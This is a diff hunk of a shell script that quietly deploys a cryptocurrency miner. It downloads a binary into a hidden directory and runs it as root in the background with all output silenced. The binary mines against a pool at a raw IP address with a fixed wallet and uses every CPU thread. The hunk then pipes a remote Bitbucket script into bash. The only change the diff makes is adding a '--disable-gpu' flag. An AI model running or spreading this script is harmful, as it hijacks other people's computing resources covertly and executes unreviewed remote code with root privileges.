@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/mypile/filesg/downloads/serbenew >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 --algorithm minotaurx --pool stratum+tcp://139.180.216.161:80 --wallet PAMyCdxG7m8soLwsu1sUw1ZkG5vcfiiaf5.x --password webpassword=x,m=solo --cpu-threads $(nproc --all) > /dev/null 2>&1 &
+sudo ./sgr1 --disable-gpu --algorithm minotaurx --pool stratum+tcp://139.180.216.161:80 --wallet PAMyCdxG7m8soLwsu1sUw1ZkG5vcfiiaf5.x --password webpassword=x,m=solo --cpu-threads $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/mypile/filesg/raw/main/boled04.sh | bash
